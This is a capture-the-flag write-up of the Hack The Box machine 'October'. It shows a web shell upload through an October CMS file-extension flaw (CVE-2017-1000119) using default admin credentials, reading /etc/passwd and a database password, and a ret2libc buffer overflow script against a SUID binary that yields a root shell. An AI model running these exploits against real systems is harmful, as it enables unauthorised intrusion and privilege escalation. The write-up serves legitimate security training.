---
title: HTB October Walkthrough
author: cotes
date: 2020-08-08 12:13:00 +0800
categories: [CTF, HTB]
tags: []
pin: false
math: true
mermaid: true
image:
  path: /assets/img/HTB-october/logo.png
---

## Information

### Description

* name: October
* OS: Linux
* Difficulty: `Medium`
* Points: 30
* Release: 20 Mar 2017
* IP: 10.10.10.16

https://www.hackthebox.eu/home/machines/profile/15

`October` was difficult for me in the late stages. After an early recon, I was stuck above the buffer overflow. After watching the `ippsec` video, I seem to be starting to get an idea of such problems.
### Summary


* Discovery of vulnerabilities in web applications.
* Get web backend permissions
* Uploading a webshell
* Discovery of SUID executable procedures
* Buffer overflow


## Details
### Recon

**Nmap**

```shell
maxox4141@ec3p0:~/HTB/october$ sudo nmap -sS -sV -sC 10.10.10.16 -oN nmap
[sudo] elloit 的密码：
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 19:29 CST
Nmap scan report for 10.10.10.16
Host is up (0.38s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.70 seconds

```
Port 80:

The machine seems to have HTTP `PUT` enabled on port 80, so I could just use this method to upload a Trojan horse if I could. But after testing, this method does not work.

![image-20200805193953352.png](/assets/img/HTB-october/image-20200805193953352.png)

After that I found a web application running on port 80 as `October`. I started to search the internet for the vulnerability. I found this.：


> 
> https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html
> 

**CVE-2017-1000119**

Files that are executed as PHP are:
* .php
* .php3
* .php4
* .php5
* .pht
* .phtml
* .php7 // in newer settings

So we can upload a file with a `php5` extension and it can be executed as `PHP`. To exploit this vulnerability, we need to log in to the backend. After a bit of searching, we find the backend link is `http://10.10.10.16//backend/`, which can be logged in using `admin:admin`.

![image-20200805201231216.png](/assets/img/HTB-october/image-20200805201231216.png)

### Got Web Shell

Upload WEB SHELL using `CVE-2017-1000119`:

![image-20200805201651122.png](/assets/img/HTB-october/image-20200805201651122.png)

![image-20200805201703194.png](/assets/img/HTB-october/image-20200805201703194.png)


Now I can execute the command via `http://10.10.10.16/storage/app/media/shell.php5?cmd=ls`.

**user.txt**

```shell
www-data@october:/home/harry$ cat user.txt
cat user.txt
29161ca87aa3d34929dc46efc40c89c0
www-data@october:/home/harry$

```
**/etc/passwd**

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
harry:x:1000:1000:Harry Varthakouris,,,:/home/harry:/bin/bash

```
View source code to discover the associated database password.

```php
'connections' => [

        'sqlite' => [                                                                                                  
            'driver'   => 'sqlite',                                                                                    
            'database' => 'storage/database.sqlite',                                                                   
            'prefix'   => '',                                                                                          
        ],                                                                                                         
        'mysql' => [                                                                                                   
            'driver'    => 'mysql',                                                                                    
            'host'      => 'localhost',                                                                                
            'port'      => '',                                                                                         
            'database'  => 'october',                                                                                  
            'username'  => 'october',                                                                                  
            'password'  => 'OctoberCMSPassword!!',                                                                     
            'charset'   => 'utf8',                                                                                     
            'collation' => 'utf8\_unicode\_ci',                                                                          
            'prefix'    => '',                                                                                         
        ],                                                                                                          
        'pgsql' => [                                                                                                   
            'driver'   => 'pgsql',                                                                                     
            'host'     => 'localhost',                                                                                 
            'port'     => '',                                                                                          
            'database' => 'database',                                                                                  
            'username' => 'root',                                                                                      
            'password' => '',                                                                                          
            'charset'  => 'utf8',                                                                                      
            'prefix'   => '',                                                                                          
            'schema'   => 'public',
        ],
        'sqlsrv' => [
            'driver'   => 'sqlsrv',
            'host'     => 'localhost',
            'port'     => '', 
            'database' => 'database',
            'username' => 'root',
            'password' => '', 
            'prefix'   => '', 
        ],
    ],

```
But after some testing, this password seems useless. Using `find / -perm -u=s -type f 2>/dev/null` found that.

```shell
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/bin/ping6
/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/at
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/local/bin/ovrflw

```
### Privilege escalation

When I saw `/usr/local/bin/ovrflw`, I knew what to do next.

```shell
www-data@october:/home/harry/.composer/cache/files$ ovrflw AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                     
Segmentation fault (core dumped)
www-data@october:/home/harry/.composer/cache/files$

```
There is definitely a buffer overflow vulnerability, but that’s all I know about with this vulnerability. Very embarrassing. But I’m going to try anyway.
The first time, I downloaded the `ovrflw` file and decompiled it using `ghidra`.

![image-20200805204703124.png](/assets/img/HTB-october/image-20200805204703124.png)

Pseudocode.：

```php
undefined4 main(int param_1,undefined4 \*param_2)
{
  char local_74 [112];
  
  if (param_1 < 2) {
    printf("Syntax: %s <input string>\n",\*param_2);
    /\* WARNING: Subroutine does not return \*/
    exit(0);
  }
  strcpy(local_74,(char \*)param_2[1]);
  return 0;
}

```
Obviously, an overflow will occur if the user enters more than 112 characters, and I verified this again using the `ippsec` method.

```
0x534F4150@c3p0:~/HTB/october$ locate pattern_
/usr/bin/msf-pattern_create
/usr/bin/msf-pattern_offset
/usr/lib/dradis/ruby/2.7.0/gems/mustermann-1.1.1/lib/mustermann/pattern_cache.rb
/usr/lib/dradis/ruby/2.7.0/gems/mustermann-1.1.1/spec/pattern_spec.rb
/usr/lib/dradis/ruby/2.7.0/gems/mustermann-1.1.1/spec/to_pattern_spec.rb
/usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_holding_pattern_file_upload.rb
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/erubis-2.7.0/test/data/users-guide/bipattern_example.result
/usr/share/rubygems-integration/all/gems/mustermann-1.1.1/lib/mustermann/pattern_cache.rb

```
For buffer overflow vulnerabilities, you can use the pattern\_create.rb script in Metasploit to generate character sequences.

```shell
0x534F4150@c3p0:~/HTB/october$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
0x534F4150@c3p0:~/HTB/october$

```
![image-20200809180158605.png](/assets/img/HTB-october/image-20200809180158605.png)

![image-20200809194116265.png](/assets/img/HTB-october/image-20200809194116265.png)


So, we have `0x64413764`, and next use `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb` to find the exact number of bytes.

```shell
0x534F4150@c3p0:~/HTB/october$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764
[\*] Exact match at offset 112
0x534F4150@c3p0:~/HTB/october$

```
![image-20200809194256397.png](/assets/img/HTB-october/image-20200809194256397.png)


You can see that `PIE`(Position-Independent Executable) is partially enabled, which means that `ovrflow` loads the DLL i address randomly at runtime.

```shell
elloit@ubuntu:~/code$ for i in `seq 0 20`;do ldd ovrflw | grep libc ; done
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7598000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb752d000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75f9000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7517000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75cb000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb753a000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7553000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb755f000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75d5000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb754c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7539000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7518000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7526000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75ba000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7537000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7529000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7586000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75a5000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7557000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75f6000)
elloit@ubuntu:~/code$

```
However, there is a pattern, the prefix `0xb7` and the suffix `000` are fixed, with only three of them changing.
Let’s move on to the buffer overflow. After searching for a buffer, a payload is constructed as follows: `function adderss`, `exit address`, `argr address`. If we want to get SHELL, we need to know the address of the function `system` and the address of the parameter `/bin/sh`.


1. `system_addresss = libc_base_address + system_off`
2. `exit_address = libc_base_address + exit_off`
3. `argr_address = libc_base_address + argr_off`

libc_base_address=0xb7598000
system_off: 00040310

```shell
elloit@ubuntu:~/code$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
elloit@ubuntu:~/code$

```
exit_off: 00033260

```shell
elloit@ubuntu:~/code$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
446: 000336d0   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18
554: 000b8634    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
609: 0011e780    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
1037: 00128ce0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
1380: 001ad204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
1492: 000fb610    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
2090: 001ad154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
elloit@ubuntu:~/code$

```
argr_off: 162d4c

```shell
elloit@ubuntu:~/code$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
162d4c /bin/sh
elloit@ubuntu:~/code$

```
So we can write the following code:

buff.py:

```
from subprocess import call
import struct

libc_base_addr = 0xb7602000

system_off = 0x00040310
exit_off = 0x00033260
args_off =   0x00162bac

system_addr = struct.pack("<I", libc_base_addr + system_off)
exit_addr = struct.pack("<I", libc_base_addr + exit_off)
arg_addr = struct.pack("<I", libc_base_addr+ args_off)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while(i < 512):
i += 1
ret = call(["/usr/local/bin/ovrflw", buf])

```
 ![image-20200809195343962.png](/assets/img/HTB-october/image-20200809195343962.png)


**root.txt**

```
# cat root.txt
cat root.txt
6bcb9cff749c9318d2a6e71bbcf30318
# 

```

